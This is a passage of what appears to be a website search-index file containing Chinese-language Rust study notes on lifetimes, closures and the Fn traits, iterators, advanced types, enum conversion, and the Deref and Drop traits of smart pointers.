<li>\u6709\u65f6\u7f16\u8bd1\u5668\u53ef\u4ee5\u81ea\u52a8\u63a8\u6d4b\u751f\u547d\u5468\u671f\uff0c\u4e0d\u9700\u8981\u663e\u793a\u6807\u6ce8</li> <li>\u6d88\u9664\u89c4\u5219\uff08\u63a8\u6d4b\u89c4\u5219\uff09<ul> <li>\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6bcf\u4e00\u4e2a\u5f15\u7528\u53c2\u6570\u90fd\u4f1a\u83b7\u5f97\u4e00\u4e2a\u72ec\u81ea\u7684\u751f\u547d\u5468\u671f</li> <li>\u5982\u679c\u53ea\u6709\u4e00\u4e2a\u8f93\u5165\u751f\u547d\u5468\u671f\uff08\u53c2\u6570\u7684\u751f\u547d\u5468\u671f\uff0c\u5373\u53ea\u6709\u4e00\u4e2a\u5f15\u7528\u7c7b\u578b\u53c2\u6570\uff09\uff0c\u5219\u8be5\u751f\u547d\u5468\u671f\u4f1a\u88ab\u8d4b\u7ed9\u6240\u6709\u8f93\u51fa\u751f\u547d\u5468\u671f</li> <li>\u5982\u679c\u5b58\u5728\u591a\u4e2a\u8f93\u5165\u751f\u547d\u5468\u671f\uff0c\u4f46\u5176\u4e2d\u4e00\u4e2a\u662f <code>&amp;self</code> \u6216 <code>&amp;mut self</code>\uff0c\u5219 self \u7684\u751f\u547d\u5468\u671f\u4f1a\u88ab\u8d4b\u7ed9\u6240\u6709\u8f93\u51fa\u751f\u547d\u5468\u671f</li> </ul> </li> <li>\u95ed\u5305\u4e0d\u4f1a\u9075\u5faa\u8fd9\u4e2a\u89c4\u5219</li> <li>impl \u5757\u751f\u547d\u5468\u671f\u6d88\u9664\uff08\u5373\u7701\u7565\uff09<ul> <li>impl \u5757\u4e2d\u6ca1\u6709\u7528\u5230\u7684\u751f\u547d\u5468\u671f\u53ef\u4ee5\u4f7f\u7528 '_ \u6765\u8fdb\u884c\u7701\u7565\uff1a     <pre><code>impl&lt;'a&gt; ... for ...&lt;'a&gt; {} \nimpl ... for ...&lt;'_&gt; {}\n</code></pre></li> </ul> </li> </ul> </li> <li>\u4e3a\u5e26\u6709\u751f\u547d\u5468\u671f\u7684\u7ed3\u6784\u4f53\u5b9e\u73b0\u65b9\u6cd5<ul> <li>\u9700\u8981\u50cf\u6cdb\u578b\u4e00\u6837\u4e3a impl \u548c\u7ed3\u6784\u4f53\u540d\u90fd\u6807\u6ce8\u4e0a\u751f\u547d\u5468\u671f     <pre><code>impl&lt;'a&gt; MyStruct&lt;'a&gt; {\n    fn method(&amp;self, another_str: &amp;str) -&gt; &amp;str {\n        println!(\"{}\", another_str);\n        self.string\n    }\n}\n</code></pre><ul> <li>\u4e0a\u9762\u4f8b\u5b50\u4e2d\u53ef\u4ee5\u4e0d\u4e3a method \u6807\u6ce8\u751f\u547d\u5468\u671f\uff0c\u56e0\u4e3a\u6839\u636e\u4e0a\u9762\u6d88\u9664\u89c4\u5219\u7684\u7b2c\u4e00\u548c\u7b2c\u4e09\u6761\uff0c\u4f1a\u81ea\u52a8\u63a8\u6d4b\u4e3a\u8fd4\u56de\u503c\u6807\u4e0a\u548c <code>&amp;self</code> \u4e00\u6837\u7684\u751f\u547d\u5468\u671f</li> </ul> </li> </ul> </li> <li>\u751f\u547d\u5468\u671f\u7ea6\u675f<ul> <li>\u5982\u60f3\u8981\u4e3a\u4e0a\u9762 method \u7684\u8fd4\u56de\u503c\u8d4b\u4e0a\u548c another_str \u4e00\u6837\u7684\u751f\u547d\u5468\u671f\uff0c\u5219\u9700\u8981\u4fdd\u8bc1\u8fd9\u4e2a\u751f\u547d\u5468\u671f\u8981\u6bd4 self \u7684\u751f\u547d\u5468\u671f\u5c0f\uff0c\u4f7f\u7528 <code>'a: 'b</code> \u8bed\u6cd5\u6765\u8868\u793a 'a \u4e00\u5b9a\u4e0d\u5c0f\u4e8e 'b     <pre><code>impl&lt;'a: 'b, 'b&gt; MyStruct&lt;'a&gt; {\n    fn method(&amp;'a self, another: &amp;'b str) -&gt; &amp;'b str {\n        println!(\"{}\", another);\n        self.string\n    }\n}\n</code></pre><ul> <li>\u6216\u8005\u4f7f\u7528 where \u6765\u5355\u72ec\u5bf9\u4e00\u4e2a\u65b9\u6cd5\u8fdb\u884c\u7ea6\u675f\uff1a     <pre><code>impl&lt;'a&gt; MyStruct&lt;'a&gt; {\n    fn method&lt;'b&gt;(&amp;'a self, another: &amp;'b str) -&gt; &amp;'b str\n        where 'a: 'b\n    {\n        println!(\"{}\", another);\n        self.string\n    }\n}\n</code></pre></li> </ul> </li> <li>T: 'a \u8868\u793a\u7c7b\u578b T \u5fc5\u987b\u83b7\u5f97\u6bd4 'a \u4e45\uff1a     <pre><code>struct Ref&lt;'a, T: 'a&gt; {\n    r: &amp;'a T\n}\n</code></pre></li> </ul> </li> <li>\u9759\u6001\u751f\u547d\u5468\u671f<ul> <li>\u548c\u6574\u4e2a\u7a0b\u5e8f\u6d3b\u5f97\u4e00\u6837\u4e45\u7684\u5f15\u7528\u53ef\u4ee5\u4f7f\u7528 'static \u6765\u6807\u6ce8\uff08\u4f8b\u5982\u5b57\u7b26\u4e32\u5b57\u9762\u91cf\uff09</li> <li>&amp;'static \u4ec5\u9488\u5bf9\u5f15\u7528\uff0c\u800c\u4e0d\u662f\u6301\u6709\u8be5\u5f15\u7528\u7684\u53d8\u91cf</li> <li>\u53d6\u60a6\u7f16\u8bd1\u5668\u53ef\u4ee5\u4f7f\u7528 T: 'static\uff0c\u5373\u4f7f T \u4e0d\u662f static \u7684     <pre><code>fn static_bound&lt;T: Display + 'static&gt;(t: &amp;T) {\n    println!(\"{}\", t);\n}\nfn main() {\n    let s1 = \"String\".to_string();\n    static_bound(&amp;s1);\n}\n</code></pre></li> </ul> </li> <li>NLL\uff08Non-Lexical Lifetime\uff09\u89c4\u5219<ul> <li>Rust 1.31 \u540e\u5f15\u7528\u7684\u751f\u547d\u5468\u671f\u4ece\u501f\u7528\u5904\u5f00\u59cb\u4e00\u76f4\u6301\u7eed\u5230 \u6700\u540e\u4e00\u6b21\u4f7f\u7528\u7684\u5730\u65b9</li> </ul> </li> <li>Reborrow \u518d\u501f\u7528     <pre><code>let mut p = Point {x: 0, y: 0};\nlet r = &amp;mut p;\nlet rr: &amp;Point = &amp;*r;\nprintln!(\"{:?}\", rr);\nr.move_to(10, 10)\nprintln!(\"{:?}\", r);\n</code></pre><ul> <li>\u53ef\u53d8\u501f\u7528\u548c\u4e0d\u53ef\u53d8\u7684\u5b83\u7684\u518d\u501f\u7528\u53ef\u4ee5\u540c\u65f6\u5b58\u5728\uff0c\u4f46\u662f\u4e0d\u80fd\u5728\u518d\u501f\u7528\u7684\u751f\u547d\u5468\u671f\u5185\u4f7f\u7528\u53ef\u53d8\u501f\u7528\u3002\u4e5f\u5c31\u662f\u4e0a\u9762\u4f8b\u5b50\u4e2d\u5728 rr \u7684\u751f\u547d\u5468\u671f\u5185\u4e0d\u80fd\u4f7f\u7528 r\uff08rr \u7684\u751f\u547d\u5468\u671f\u7531\u4e8e NLL \u89c4\u5219\uff0c\u5230\u7b2c\u4e00\u4e2a println! \u7684\u65f6\u5019\u5c31\u5df2\u7ecf\u7ed3\u675f\u4e86\uff0c\u540e\u9762\u53ef\u4ee5\u7ee7\u7eed\u4f7f\u7528 r\uff09</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_57","title":"\u95ed\u5305\u548c\u8fed\u4ee3\u5668","text":""},{"location":"cs/pl/rust/basic/#_58","title":"\u95ed\u5305","text":"<ul> <li>\u4e00\u79cd\u533f\u540d\u51fd\u6570\uff0c\u53ef\u4ee5\u8d4b\u503c\u7ed9\u53d8\u91cf\u4e5f\u53ef\u4ee5\u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u51fd\u6570\uff0c\u4f46\u53ef\u4ee5\u6355\u83b7\u8c03\u7528\u8005\u4f5c\u7528\u57df\u4e2d\u7684\u503c     <pre><code>let x = 1;\nlet sum = |y| x + y;\nassert_eq!(3, sum(2));\n</code></pre></li> <li>\u95ed\u5305\u8bed\u6cd5\uff1a     <pre><code>|para1, para2, ...| {\n    statement1;\n    statement2;\n    expression\n}\n|para1, para2, ...| expression\n</code></pre></li> <li>\u7c7b\u578b\u63a8\u5bfc<ul> <li>\u95ed\u5305\u4e0d\u4f1a\u4f5c\u4e3a api \u5bf9\u5916\u63d0\u4f9b\uff0c\u53ef\u4ee5\u76f4\u63a5\u4f9d\u9760\u7f16\u8bd1\u5668\u7684\u7c7b\u578b\u63a8\u5bfc\u80fd\u529b\uff0c\u65e0\u9700\u624b\u52a8\u6807\u6ce8     ```rust     let sum = |x, y| x + y;     let v = sum(1, 2) // \u7f16\u8bd1\u5668\u901a\u8fc7\u8fd9\u53e5\u63a8\u5bfc\u51fa\u7c7b\u578b     ````</li> <li>\u4f46\u5f53\u95ed\u5305\u53ea\u58f0\u660e\u6ca1\u6709\u4f7f\u7528\u65f6\uff0c\u7f16\u8bd1\u5668\u5e76\u4e0d\u80fd\u63a8\u5bfc\u51fa\u7c7b\u578b\uff0c\u9700\u8981\u624b\u52a8\u6807\u6ce8</li> <li>\u5f53\u7f16\u8bd1\u5668\u63a8\u5bfc\u51fa\u4e00\u79cd\u7c7b\u578b\u4e4b\u540e\uff0c\u5c31\u4f1a\u4e00\u76f4\u4f7f\u7528\u8be5\u7c7b\u578b\uff0c\u800c\u4e0d\u80fd\u5c06\u95ed\u5305\u5f53\u4f5c\u6cdb\u578b\u4f7f\u7528</li> </ul> </li> <li>\u7ed3\u6784\u4f53\u4e2d\u5b58\u50a8\u95ed\u5305     <pre><code>struct Cacher&lt;T, E&gt;\n    where T: Fn(E) -&gt; E,\n          E: Copy\n{\n    query: T,\n    value: Option&lt;E&gt;,\n}\n</code></pre><ul> <li>\u95ed\u5305\u7c7b\u578b\u4e00\u5b9a\u8981\u901a\u8fc7\u6cdb\u578b\u6765\u5b9a\u4e49\uff0c\u56e0\u4e3a\u4e0d\u540c\u5b9e\u73b0\u7684\u7c7b\u578b\u90fd\u662f\u4e0d\u4e00\u6837\u7684\uff0c\u8981\u6c42\u4ec5\u4ec5\u662f\u5b9e\u73b0 Fn(E) -&gt; E \u8fd9\u4e2a trait\uff0c\u5373\u8f93\u5165 E \u8fd4\u56de E</li> </ul> </li> <li>\u4e09\u79cd Fn trait<ul> <li>FnOnce\uff1a\u53ea\u80fd\u8fd0\u884c\u4e00\u6b21\uff08\u4f1a\u5e26\u8d70\u88ab\u6355\u83b7\u53d8\u91cf\u7684\u6240\u6709\u6743\uff09<ul> <li>\u5e26\u8d70\u6240\u6709\u6743\u7684\u4f8b\u5b50\uff1a     <pre><code>    let x = String::from(\"test\");\n    let sum = |y| x + y;\n    println!(\"{}\", sum(\"test\"));\n    println!(\"{}\", x); // \u62a5\u9519\uff0c\u56e0\u4e3a\u6240\u6709\u6743\u8fdb\u5165\u4e86\u95ed\u5305\u4e2d    \n</code></pre></li> <li>\u4ec5\u5b9e\u73b0\u4e86 FnOnce \u7684\u95ed\u5305\u5728\u8c03\u7528\u65f6\u4f1a\u8f6c\u79fb\u6240\u6709\u6743\uff0c\u4e0d\u80fd\u8c03\u7528\u4e24\u6b21\uff1a     <pre><code>fn fn_once&lt;F&gt;(func: F)\n    where F: FnOnce(usize) -&gt; bool\n{\n    func(1);\n    func(2); // \u62a5\u9519\n}\n</code></pre><ul> <li>\u4f46\u662f\u7ed9 F \u52a0\u4e00\u4e2a Copy \u7684\u7ea6\u675f\u5219\u53ef\u4ee5\u8c03\u7528\u591a\u6b21</li> </ul> </li> <li>\u5728\u53c2\u6570\u5217\u8868\u524d\u52a0 move \u5173\u952e\u5b57\u5f3a\u5236\u95ed\u5305\u83b7\u53d6\u6355\u83b7\u53d8\u91cf\u7684\u6240\u6709\u6743\uff08\u805a\u7126\u4e8e\u5982\u4f55\u6355\u83b7\u53d8\u91cf\uff09</li> </ul> </li> <li>FnMut\uff1a\u4ee5\u53ef\u53d8\u501f\u7528\u65b9\u5f0f\u6355\u83b7\u73af\u5883\u4e2d\u7684\u503c<ul> <li>\u76f4\u63a5\u8c03\u7528\u65f6\u9700\u8981\u5c06\u95ed\u5305\u6807\u8bb0\u4e3a mut     <pre><code>let mut s = String::new();\nlet mut update_string = |st| s.push_str(st);\nupdate_string(\"test\");\n</code></pre></li> <li>\u5f53\u4f5c\u53d8\u91cf\u65f6\u4e0d\u9700\u8981\u6807\u8bb0\u4e3a mut     <pre><code>fn exec&lt;'a, F: FnMut(&amp;'a str)&gt;(mut f: F) { // \u8fd9\u91cc\u9700\u8981 mut\n    f(\"test\");\n}\nfn main() {\n    let mut s = String::new();\n    let update_string = |st| s.push_str(st); // \u8fd9\u91cc\u4e0d\u9700\u8981 mut\n    exec(update_string);\n}\n</code></pre></li> </ul> </li> <li>Fn\uff1a\u4ee5\u4e0d\u53ef\u53d8\u501f\u7528\u7684\u65b9\u5f0f\u6355\u83b7\u73af\u5883\u4e2d\u7684\u503c</li> <li>\u4e00\u4e2a\u95ed\u5305\u5b9e\u73b0\u4e86\u54ea\u79cd Fn trait \u53d6\u51b3\u4e8e\u8be5\u95ed\u5305\u5982\u4f55\u4f7f\u7528\u88ab\u6355\u83b7\u7684\u53d8\u91cf\uff0c\u800c\u4e0d\u662f\u5982\u4f55\u6355\u83b7\u3002\u800c move \u5219\u5173\u6ce8\u4e8e\u5982\u4f55\u6355\u83b7\uff0c\u6709 move \u5219\u5f3a\u5236\u83b7\u53d6\u6240\u6709\u6743<ul> <li>\u4f7f\u7528\u4e86 move \u5173\u952e\u5b57\u4ecd\u7136\u53ef\u4ee5\u5b9e\u73b0 Fn trait\uff08\u5f53\u95ed\u5305\u5bf9\u4e8e\u6355\u83b7\u53d8\u91cf\u7684\u4f7f\u7528\u4ec5\u4ec5\u662f\u4e0d\u53ef\u53d8\u501f\u7528\u65f6\uff09</li> </ul> </li> <li>\u4e09\u79cd Fn \u7684\u5173\u7cfb     <pre><code>pub trait Fn&lt;Args&gt; : FnMut&lt;Args&gt; {\n    extern \"rust-call\" fn call(&amp;self, args: Args) -&gt; Self::Output;\n}\n\npub trait FnMut&lt;Args&gt; : FnOnce&lt;Args&gt; {\n    extern \"rust-call\" fn call_mut(&amp;mut self, args: Args) -&gt; Self::Output;\n}\n\npub trait FnOnce&lt;Args&gt; {\n    type Output;\n    extern \"rust-call\" fn call_once(self, args: Args) -&gt; Self::Output;\n}\n</code></pre><ul> <li>\u6240\u6709\u95ed\u5305\u90fd\u4f1a\u5b9e\u73b0 FnOnce trait\uff0c\u56e0\u4e3a\u81f3\u5c11\u53ef\u4ee5\u88ab\u8c03\u7528\u4e00\u6b21</li> <li>\u6ca1\u6709\u79fb\u51fa\u6355\u83b7\u53d8\u91cf\u6240\u6709\u6743\u7684\u95ed\u5305\u81ea\u52a8\u5b9e\u73b0 FnMut trait</li> <li>\u4e0d\u9700\u8981\u5bf9\u6355\u83b7\u53d8\u91cf\u8fdb\u884c\u6539\u53d8\u7684\u95ed\u5305\u81ea\u52a8\u5b9e\u73b0 Fn trait</li> <li>\u5b9e\u73b0 Fn \u7684\u524d\u63d0\u662f\u5b9e\u73b0 FnMut\uff0c\u5b9e\u73b0 FnMut \u7684\u524d\u63d0\u662f\u5b9e\u73b0 FnOnce</li> <li>Fn \u83b7\u53d6 &amp;self\u3001FnMut \u83b7\u53d6 &amp;mut self\u3001FnOnce \u83b7\u53d6 self</li> <li>\u5efa\u8bae\u5148\u4f7f\u7528 Fn\uff0c\u7136\u540e\u9760\u7f16\u8bd1\u5668\u6765\u5224\u65ad\u6b63\u8bef\u4ee5\u53ca\u5982\u4f55\u9009\u62e9</li> </ul> </li> </ul> </li> <li>\u95ed\u5305\u4f5c\u4e3a\u8fd4\u56de\u503c<ul> <li>\u4e0d\u80fd\u4f7f\u7528 Fn(...) -&gt; ... \u4f5c\u4e3a\u8fd4\u56de\u503c\uff0c\u56e0\u4e3a\u5b83\u662f\u7279\u5f81\uff0c\u6ca1\u6709\u56fa\u5b9a\u5185\u5b58\u5927\u5c0f</li> <li>\u53ef\u4ee5\u4f7f\u7528 impl Fn(...) -&gt; ... \u4f5c\u4e3a\u8fd4\u56de\u503c</li> <li>\u53ef\u4ee5\u4f7f\u7528\u7279\u5f81\u5bf9\u8c61\uff0c\u5373 Box&lt;dyn Fn(...) -&gt; ...&gt; \u7684\u5f62\u5f0f</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_59","title":"\u8fed\u4ee3\u5668","text":"<ul> <li>for \u5faa\u73af\u904d\u5386\u6570\u7ec4\u5b9e\u9645\u4e0a\u662f\u5728\u6570\u7ec4\u4e0a\u8c03\u7528\u4e86 into_iter \u65b9\u6cd5\uff08\u6765\u81ea IntoIterator trait\uff09</li> <li>Iterator trait     <pre><code>pub trait Iterator {\n    type Item;\n    fn next(&amp;mut self) -&gt; Option&lt;Self::Item&gt;;\n}\n</code></pre><ul> <li>next \u65b9\u6cd5\u6709\u503c\u65f6\u8fd4\u56de Some(...)\uff0c\u8fed\u4ee3\u7ed3\u675f\u5219\u8fd4\u56de None</li> <li>\u624b\u52a8\u8fed\u4ee3\u5fc5\u987b\u58f0\u660e\u8fed\u4ee3\u5668\u4e3a mut</li> <li>\u4ec5\u9700\u8981\u5b9e\u73b0 next \u65b9\u6cd5\uff0c\u5176\u5b83\u65b9\u6cd5\u6709\u9ed8\u8ba4\u5b9e\u73b0</li> </ul> </li> <li>IntoIterator trait<ul> <li>Iterator \u81ea\u52a8\u5b9e\u73b0 IntoIterator     <pre><code>impl&lt;I: Iterator&gt; IntoIterator for I {\n    type Item = I::Item;\n    type IntoIter = I;\n    #[inline]\n    fn into_iter(self) -&gt; I { self }\n}\n</code></pre></li> </ul> </li> <li>into_iter\u3001iter\u3001iter_mut<ul> <li>.into_iter \u4f1a\u593a\u8d70\u6240\u6709\u6743</li> <li>.iter \u662f\u4e0d\u53ef\u53d8\u501f\u7528\uff0c\u8c03\u7528 next \u8fd4\u56de Some(&amp;T)</li> <li>.iter_mut \u662f\u53ef\u53d8\u501f\u7528\uff0c\u8c03\u7528 next \u8fd4\u56de Some(&amp;mut T)</li> </ul> </li> <li>\u6d88\u8d39\u8005\u9002\u914d\u5668<ul> <li>\u5185\u90e8\u8c03\u7528\u4e86 next \u7684\u8fed\u4ee3\u5668\u65b9\u6cd5\uff0c\u4f1a\u6d88\u8017\u8fed\u4ee3\u5668\u4e0a\u5143\u7d20\uff0c\u8fd4\u56de\u5176\u5b83\u503c\uff0c\u79f0\u4e3a\u6d88\u8d39\u8005\u9002\u914d\u5668</li> <li>\u4f8b\u5982 .sum \u65b9\u6cd5\uff0c\u5185\u90e8\u8c03\u7528 next \u6765\u5bf9\u6240\u6709\u5143\u7d20\u6c42\u548c\uff0c\u4e5f\u4f1a\u62ff\u8d70\u8fed\u4ee3\u5668\u7684\u6240\u6709\u6743</li> <li>collect \u65b9\u6cd5\u53ef\u4ee5\u5c06\u8fed\u4ee3\u5668\u4e2d\u7684\u503c\u6536\u96c6\u5230\u96c6\u5408\u7c7b\u578b\u4e2d\uff0c\u4f46\u9700\u8981\u5148\u6807\u6ce8\u8981\u6536\u96c6\u5230\u7684\u7c7b\u578b     <pre><code>let v: Vec&lt;_&gt; = iterator.collect();\n</code></pre></li> </ul> </li> <li>\u8fed\u4ee3\u5668\u9002\u914d\u5668<ul> <li>\u8fed\u4ee3\u5668\u9002\u914d\u5668\u6216\u8fd4\u56de\u65b0\u7684\u8fed\u4ee3\u5668</li> <li>\u4f8b\u5982 .map .filter .zip</li> <li>\u53ef\u4ee5\u8fdb\u884c\u94fe\u5f0f\u8c03\u7528\uff0c\u4e00\u822c\u4f7f\u7528 collect \u6536\u5c3e\u6536\u96c6\u5143\u7d20</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_60","title":"\u6df1\u5165\u7c7b\u578b","text":"<ul> <li>newtype<ul> <li>\u5373\u4f7f\u7528\u4e00\u4e2a\u5143\u7ec4\u7ed3\u6784\u4f53\u6765\u5305\u88c5</li> <li>\u53ef\u4ee5\u4e3a\u5916\u90e8\u7c7b\u578b\u5b9e\u73b0\u5916\u90e8 trait</li> <li>\u53ef\u4ee5\u5177\u6709\u66f4\u597d\u7684\u53ef\u8bfb\u6027\uff0c\u4ee5\u53ca\u53ef\u4ee5\u5b9e\u73b0\u7c7b\u578b\u5f02\u5316</li> </ul> </li> <li>\u7c7b\u578b\u522b\u540d<ul> <li>\u5982 <code>type Meters = u32</code></li> <li>\u4ec5\u4ec5\u662f\u522b\u540d\uff0c\u5e76\u4e0d\u662f\u5168\u65b0\u7c7b\u578b\uff0c\u5373\u4e0a\u9762 Meters \u7c7b\u578b\u548c u32 \u5728\u7f16\u8bd1\u5668\u773c\u91cc\u6ca1\u6709\u533a\u522b</li> <li>\u53ef\u4ee5\u589e\u52a0\u53ef\u8bfb\u6027\u3001\u7b80\u5316\u4ee3\u7801</li> </ul> </li> <li>\u7528\u4e0d\u8fd4\u56de\u7c7b\u578b !<ul> <li>\u5bf9\u4e8e match\uff0c\u5404\u5206\u652f\u8fd4\u56de\u7684\u7c7b\u578b\u9700\u8981\u4e00\u81f4\uff0c\u4f46\u5982\u679c\u6709\u5206\u652f\u8fd4\u56de ! \u7c7b\u578b\uff0c\u5219\u53ef\u4ee5\u5ffd\u7565\u8fd9\u4e2a\u5206\u652f</li> </ul> </li> <li>\u5b9a\u957f\u7c7b\u578b\u4e0e\u4e0d\u5b9a\u957f\u7c7b\u578b<ul> <li>\u5b9a\u957f\u7c7b\u578b\u81ea\u52a8\u5b9e\u73b0 Sized trait\uff0c\u5e76\u4e14\u5728\u4f7f\u7528\u6cdb\u578b\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u6dfb\u52a0 Sized \u7ea6\u675f</li> <li>\u4e0d\u5b9a\u957f\u7c7b\u578b\uff08\u52a8\u6001\u5927\u5c0f\u7c7b\u578b\uff0cDST\uff09\uff0c\u5305\u62ec\u5207\u7247\u3001str\u3001\u7279\u5f81\u7b49\uff08Vec \u7b49\u96c6\u5408\u7c7b\u578b\u662f\u5b9a\u957f\u7684\uff0c\u56e0\u4e3a\u5728\u6808\u4e0a\u5b58\u50a8\u7684\u4fe1\u606f\u5b9a\u957f\uff09<ul> <li>DST \u65e0\u6cd5\u5355\u72ec\u4f7f\u7528\uff0c\u53ea\u80fd\u901a\u8fc7\u5f15\u7528\u6216\u8005 Box \u6765\u95f4\u63a5\u4f7f\u7528\uff0c\u5982\u5c06\u7279\u5f81\u5c01\u88c5\u4e3a\u7279\u5f81\u5bf9\u8c61</li> <li>?Size \u7279\u5f81\u8868\u793a\u65e2\u6709\u53ef\u80fd\u662f\u56fa\u5b9a\u5927\u5c0f\u7c7b\u578b\u4e5f\u6709\u53ef\u80fd\u662f DST\uff1a     <pre><code>fn func&lt;T: ?Sized&gt;(t: &amp;T) {}\n</code></pre></li> <li>\u5c06 str \u5305\u88f9\u4e3a Box&lt;str&gt; \u4e0d\u80fd\u76f4\u63a5\u4f7f\u7528 Box::new(\"...\" as str)\uff0c\u56e0\u4e3a\u8fd9\u91cc\u5e76\u4e0d\u80fd\u77e5\u9053 str \u7684\u5927\u5c0f\u3002\u53ef\u4ee5\u4f7f\u7528 .into() \u6765\u8ba9\u7f16\u8bd1\u5668\u6765\u8f6c\u6362\u7c7b\u578b\uff08\u5c06 &amp;str \u8f6c\u4e3a Box\uff09     <pre><code>let s: Box&lt;str&gt; = \"...\".into();\n</code></pre></li> </ul> </li> </ul> </li> <li>\u6574\u6570\u4e0e\u679a\u4e3e\u7684\u7c7b\u578b\u8f6c\u6362     <pre><code>enum MyEnum {\n    A = 1,\n    B = 2,\n    C = 3,\n}\n</code></pre><ul> <li>\u5c06\u679a\u4e3e\u8f6c\u6362\u4e3a\u6574\u6570\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528 as\uff1a     <pre><code>let x = MyEnum::A as i32;\n</code></pre></li> <li>\u6574\u6570\u8f6c\u4e3a\u679a\u4e3e\u5219\u76f8\u5bf9\u590d\u6742\uff0c\u6709\u51e0\u79cd\u65b9\u6cd5<ul> <li>\u4f7f\u7528\u7b2c\u4e09\u65b9\u5e93\uff1anum-traits num-derive \u6216 num_enums \u7b49</li> <li>\u4f7f\u7528 TryFrom trait     <pre><code>use std::convert::TryFrom;\nimpl TryFrom&lt;i32&gt; for MyEnum {\n    type Error = ();\n    fn try_from(v: i32) -&gt; Result&lt;Self, Self::Error&gt; {\n        match v {\n            x if x == MyEnum::A as i32 =&gt; Ok(MyEnum::A),\n            x if x == MyEnum::B as i32 =&gt; Ok(MyEnum::B),\n            x if x == MyEnum::C as i32 =&gt; Ok(MyEnum::C),\n            _ =&gt; Err(()),\n        }\n    }\n}\n</code></pre><ul> <li>\u4e3a MyEnum \u5b9e\u73b0\u4e86 TryFrom&lt;i32&gt; \u540e\u5c31\u53ef\u4ee5\u8c03\u7528 i32.try_into() \u6765\u5c1d\u8bd5\u8f6c\u4e3a MyEnum \u4e86     <pre><code>let x = 1\nmatch x.try_into() {\n    Ok(EyEnum::A) =&gt; ...,\n    ...\n}\n</code></pre></li> </ul> </li> <li>\u4f7f\u7528 unsafe transmute \u8f6c\u6362     <pre><code>#[repr(i32)] // \u89c4\u5b9a\u5185\u90e8\u5b58\u50a8\u4e3a i32\nenum MyEnum {\n    ...\n}\n\nlet x: i32 = 1;\nlet y: MyEnum = unsafe { std::mem::transmute(x) };\n</code></pre></li> </ul> </li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#_61","title":"\u667a\u80fd\u6307\u9488","text":"<ul> <li>\u5f15\u7528\u4ec5\u662f\u501f\u7528\u6570\u636e\uff0c\u800c\u667a\u80fd\u6307\u9488\u5f80\u5f80\u53ef\u4ee5\u62e5\u6709\u6307\u5411\u7684\u6570\u636e</li> <li>\u667a\u80fd\u6307\u9488\u5b9e\u73b0\u4e86 Deref \u548c Drop trait<ul> <li>Deref \u8ba9\u667a\u80fd\u6307\u9488\u53ef\u4ee5\u50cf\u5f15\u7528\u4e00\u6837\u5de5\u4f5c</li> <li>Drop \u5141\u8bb8\u6307\u5b9a\u667a\u80fd\u6307\u9488\u8d85\u51fa\u4f5c\u7528\u57df\u540e\u81ea\u52a8\u6267\u884c\u7684\u4ee3\u7801</li> </ul> </li> </ul>"},{"location":"cs/pl/rust/basic/#deref-trait","title":"Deref trait","text":"<ul> <li><code>use std::ops::Deref</code></li> <li>\u5b9e\u73b0\u4e86 Deref \u4e4b\u540e\u5c31\u53ef\u4ee5\u4f7f\u7528 * \u89e3\u5f15\u7528\u4e86     <pre><code>use std::ops::Deref\nstruct MyBox&lt;T&gt;(T);\nimpl&lt;T&gt; MyBox&lt;T&gt; {\n    fn new(x: T) -&gt; MyBox&lt;T&gt; { MyBox(x) }\n}\nimpl&lt;T&gt; Deref for MyBox&lt;T&gt; {\n    type Target = T;\n    fn deref(&amp;self) -&gt; &amp;Self::Target {\n        &amp;self.0\n    }\n}\n</code></pre><ul> <li>deref \u8fd4\u56de\u5185\u90e8\u503c\u7684\u6b63\u5e38\u5f15\u7528\uff0c\u53ef\u4ee5\u4f7f\u7528 * \u6765\u89e3\u5f15\u7528</li> <li>\u5bf9 MyBox \u8fdb\u884c\u89e3\u5f15\u7528\u65f6\u5b9e\u9645\u4e0a\u8c03\u7528\u7684\u662f <code>*(x.deref())</code></li> </ul> </li> <li>\u53c2\u6570\u4e2d\u9690\u5f0f Deref \u8f6c\u6362     <pre><code>fn func(s: &amp;str) { println!(\"{}\", s) }\nfn main() {\n    let s = MyBox::new(String::from(\"...\"));\n    func(&amp;s);\n}\n</code></pre><ul> <li>\u8c03\u7528\u65f6 &amp;s: &amp;MyBox -&gt; &amp;String -&gt; &amp;str <li>\u5f15\u7528\u5f52\u4e00\u5316<ul> <li>\u667a\u80fd\u6307\u9488\u4f1a\u4ece\u7ed3\u6784\u4f53\u4e2d\u8131\u58f3\u51fa\u6765\u5f97\u5230\u5185\u90e8\u7684\u5f15\u7528\u7c7b\u578b</li> <li>\u591a\u91cd\u5f15\u7528\u53ef\u4ee5\u5f52\u4e00\u5316     <pre><code>impl&lt;T: ?Sized&gt; Deref for &amp;T {\n    type Target = T;\n    fn deref(&amp;self) -&gt; &amp;T {\n        *self  // \u8fd9\u91cc self \u662f &amp;&amp;T \u7c7b\u578b\n    }\n}\n</code></pre></li> </ul> </li> <li>DerefMut \u4e0e Deref<ul> <li>\u5f53 T: Deref&lt;Target=U&gt; \u65f6\uff0c&amp;T \u53ef\u4ee5\u8f6c\u6362\u4e3a &amp;U\u3001&amp;mut T \u4e5f\u53ef\u4ee5\u8f6c\u6362\u4e3a &amp;U\uff08rust \u53ef\u4ee5\u628a\u53ef\u53d8\u5f15\u7528\u9690\u5f0f\u8f6c\u6362\u4e3a\u4e0d\u53ef\u53d8\u5f15\u7528\uff09</li> <li>\u5f53 T: DerefMut&lt;Target=U&gt; \u65f6\uff0c&amp;mut T \u53ef\u4ee5\u8f6c\u6362\u4e3a &amp;mut U</li> <li>\u5b9e\u73b0 DerefMut trait \u9700\u8981\u5148\u5b9e\u73b0 Deref     <pre><code>use std::ops::DerefMut;\nimpl&lt;T&gt; DerefMut for MyBox&lt;T&gt; {\n    fn deref_mut(&amp;mut self) -&gt; &amp;mut Self::Target {\n        &amp;mut self.0\n    }\n}\n</code></pre></li> </ul> </li>"},{"location":"cs/pl/rust/basic/#drop-trait","title":"Drop trait","text":"<ul> <li>\u53d8\u91cf\u79bb\u5f00\u4f5c\u7528\u57df\u7684\u65f6\u5019\u4f1a\u81ea\u52a8\u6267\u884c Drop trait \u7684 drop \u65b9\u6cd5</li> 